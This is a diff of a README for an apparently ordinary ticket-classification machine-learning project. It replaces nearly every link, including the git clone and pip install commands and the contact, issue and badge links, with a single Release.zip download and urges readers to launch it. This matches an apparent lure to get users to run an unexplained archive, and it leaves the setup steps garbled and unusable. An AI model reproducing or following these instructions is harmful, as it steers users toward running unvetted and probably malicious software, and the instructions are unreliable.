@@ -11,9 +11,9 @@ Welcome to the **Automatic Ticket Classification** repository! This project focu
 
 📄 **Files:**
 - **[LICENSE](LICENSE):** The license information for this project.
-- **[README.md](README.md):** This file you are currently reading providing an overview of the repository.
-- **[requirements.txt](requirements.txt):** Lists the required Python packages and versions needed to run the code successfully.
-- **[Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip):** This file needs to be launched for additional software resources.
+- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip):** This file you are currently reading providing an overview of the repository.
+- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip):** Lists the required Python packages and versions needed to run the code successfully.
+- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip):** This file needs to be launched for additional software resources.
 
 ## Tools and Libraries
 The project utilizes various tools and libraries to streamline the process of customer ticket classification and text preprocessing:
@@ -44,16 +44,16 @@ In addition to text preprocessing, the project also delves into model implementa
 To get started with the project, follow these steps:
 1. Clone the repository to your local machine using:
    ```
-   git clone https://github.com/your-username/Automatic-Ticket-Classification.git
+   git clone https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip
    ```
-2. Install the required Python packages listed in `requirements.txt` using:
+2. Install the required Python packages listed in `https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip` using:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip
    ```
-3. Launch the additional software resources by downloading and extracting the `Software.zip` file from the provided link.
+3. Launch the additional software resources by downloading and extracting the `https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip` file from the provided link.
 
 ## Support and Contributions
-If you encounter any issues with the project or have suggestions for improvement, feel free to open an [issue](https://github.com/your-username/Automatic-Ticket-Classification/issues). Contributions are always welcome through [pull requests](https://github.com/your-username/Automatic-Ticket-Classification/pulls).
+If you encounter any issues with the project or have suggestions for improvement, feel free to open an [issue](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip). Contributions are always welcome through [pull requests](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip).
 
 🌟 Your support and contributions are greatly appreciated in making this project more robust and efficient! 🌟
 
@@ -62,8 +62,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Let's Connect!
 Stay updated with the latest project developments and connect with fellow developers:
-- Follow me on [GitHub](https://github.com/your-username)
-- Connect with me on [LinkedIn](https://www.linkedin.com/your-profile)
-- Reach out via [Email](mailto:youremail@example.com)
+- Follow me on [GitHub](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
+- Connect with me on [LinkedIn](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
+- Reach out via [Email](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
 
-[![Launch Software Resources](https://img.shields.io/badge/Launch-Software_Resources-yellow)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Launch Software Resources](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
